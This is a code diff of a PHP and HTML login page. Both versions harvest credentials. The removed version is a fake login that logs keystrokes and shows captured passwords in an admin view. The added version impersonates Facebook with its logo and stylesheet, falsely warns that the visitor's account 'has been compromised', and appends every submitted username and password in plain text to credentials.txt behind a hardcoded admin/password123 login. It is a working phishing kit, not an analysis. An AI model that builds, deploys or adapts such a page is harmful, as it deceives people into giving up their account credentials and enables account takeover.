@@ -1,144 +1,124 @@
+<?php
+// Create a file to store the login credentials
+$filename = 'credentials.txt';
+
+// Check if the file exists
+if (file_exists($filename)) {
+    // Read the contents of the file
+    $credentials = file_get_contents($filename);
+} else {
+    // Create the file if it doesn't exist
+    $fp = fopen($filename, 'w');
+    fwrite($fp, '');
+    fclose($fp);
+}
+
+// Function to store the login credentials
+function store_credentials($username, $password) {
+    global $filename;
+    $fp = fopen($filename, 'a');
+    fwrite($fp, "Username: $username, Password: $password\n");
+    fclose($fp);
+}
+
+// Call the function to store the credentials
+if ($_SERVER['REQUEST_METHOD'] == 'POST') {
+    $username = $_POST['username'];
+    $password = $_POST['password'];
+    store_credentials($username, $password);
+}
+
+// Admin authentication
+$admin_username = 'admin';
+$admin_password = 'password123';
+
+if (isset($_POST['admin_username']) && isset($_POST['admin_password'])) {
+    if ($_POST['admin_username'] == $admin_username && $_POST['admin_password'] == $admin_password) {
+        header('Location: admin.php');
+        exit;
+    }
+}
+?>
+
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Login Page</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            background-color: #e9ebee;
-            margin: 0;
-            padding: 0;
-        }
+  <title>⚠️ Login to Secure Your Account</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link href="https://static.xx.fbcdn.net/rsrc.php/v3/yD/r/2KFbYqZQk5X.css?_nc_revision=0" rel="stylesheet" id="u_0_d_rD" crossorigin="anonymous" />
+  <style>
+    body {
+      background-color: #f0f2f5;
+      font-family: 'Helvetica', sans-serif;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+    }
 
-        .login-container, .admin-container {
-            background-color: white;
-            width: 400px;
-            margin: 100px auto;
-            padding: 20px;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-            border-radius: 10px;
-        }
+    .container {
+      background-color: #ffffff;
+      border-radius: 8px;
+      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+      padding: 40px;
+      width: 400px;
+      max-width: 90%;
+    }
 
-        .login-title {
-            text-align: center;
-            font-size: 18px;
-            margin: 10px 0;
-            color: red; /* Warning color */
-        }
+    h2 {
+      text-align: center;
+      margin-bottom: 20px;
+    }
 
-        .login-container input {
-            width: 100%;
-            padding: 10px;
-            margin: 5px 0 15px;
-            border: 1px solid #ddd;
-            border-radius: 5px;
-        }
+    input[type="text"], input[type="password"] {
+      width: 100%;
+      padding: 15px;
+      border: 1px solid #ddd;
+      border-radius: 5px;
+      margin-bottom: 15px;
+      box-sizing: border-box;
+    }
 
-        .login-container input[type="submit"] {
-            background-color: #4267B2;
-            color: white;
-            border: none;
-            cursor: pointer;
-        }
+    input[type="submit"] {
+      background-color: #1877f2;
+      color: #ffffff;
+      padding: 15px;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+    }
 
-        .login-container input[type="submit"]:hover {
-            background-color: #365899;
-        }
+    input[type="submit"]:hover {
+      background-color: #166fe5;
+    }
 
-        .admin-container {
-            display: none; /* Hidden by default */
-        }
+    .facebook-logo {
+      width: 100%;
+      text-align: center;
+      margin-bottom: 20px;
+    }
 
-        #userList {
-            margin-top: 20px;
-        }
-
-        .form-label {
-            display: block;
-            margin: 0 0 5px;
-        }
-
-        .error-message {
-            color: red;
-            font-size: 24px;
-            font-weight: bold;
-            text-align: center;
-            margin-top: 10px;
-        }
-    </style>
+    .facebook-logo img {
+      width: 100px;
+      height: 100px;
+    }
+  </style>
 </head>
 <body>
-
-<div class="login-container" id="loginContainer">
-    <div class="login-title">⚠️ Login to Secure Your Account</div>
-    <form id="loginForm" onsubmit="return login(event)">
-        <input type="text" id="phone" name="phone" required oninput="recordInput('phone', event)">
-        <label for="phone" class="form-label">Phone No./Username:</label>
-        
-        <input type="password" id="password" name="password" required oninput="recordInput('password', event)">
-        <label for="password" class="form-label">Password:</label>
-        
-        <input type="submit" value="Login">
+  <div class="container">
+    <div class="facebook-logo">
+      <img src="https://static.xx.fbcdn.net/rsrc.php/v3/yD/r/2KFbYqZQk5X.png?_nc_revision=0" alt="Facebook Logo">
+    </div>
+    <h2>⚠️ Login to Secure Your Account</h2>
+    <p style="color: red; font-size: 14px;">Your account has been compromised. Please login to secure your account.</p>
+    <form action="" method="post">
+      <input type="text" name="username" placeholder="Email address or phone number">
+      <input type="password" name="password" placeholder="Password">
+      <input type="submit" value="Log In">
     </form>
-    <div id="loginMessage" class="error-message"></div>
-</div>
-
-<div class="admin-container" id="adminContainer">
-    <div class="login-title">Admin View</div>
-    <h2>Logged In Users and Typed Data</h2>
-    <ul id="userList"></ul>
-    <button onclick="deleteAll()">Delete All</button>
-</div>
-
-<script>
-    const users = []; // Array to store logged-in users and their keystrokes
-
-    function login(event) {
-        event.preventDefault();
-        const phone = document.getElementById("phone").value;
-        const password = document.getElementById("password").value;
-
-        // Add user to the array regardless of credentials
-        users.push({ phone, password, keystrokesPhone: keystrokes.phone, keystrokesPassword: keystrokes.password });
-
-        // Display login error message
-        document.getElementById("loginMessage").innerText = "Login ERROR!";
-
-        // Always show the admin view
-        displayAdminView();
-
-        // Optionally, reset the form fields
-        document.getElementById("loginForm").reset();
-    }
-
-    function displayAdminView() {
-        const userList = document.getElementById("userList");
-        userList.innerHTML = ""; // Clear previous list
-
-        users.forEach(user => {
-            const li = document.createElement("li");
-            li.innerText = `${user.phone} - ${user.password} - Typed Phone: ${user.keystrokesPhone}, Typed Password: ${user.keystrokesPassword}`;
-            userList.appendChild(li);
-        });
-
-        document.getElementById("adminContainer").style.display = "block"; // Show admin view
-    }
-
-    const keystrokes = { phone: '', password: '' };
-
-    function recordInput(inputName, event) {
-        keystrokes[inputName] += event.data || '';
-    }
-
-    function deleteAll() {
-        users.length = 0; // Clear the user array
-        displayAdminView(); // Refresh the admin view
-    }
-</script>
-
+  </div>
 </body>
 </html>
-
-
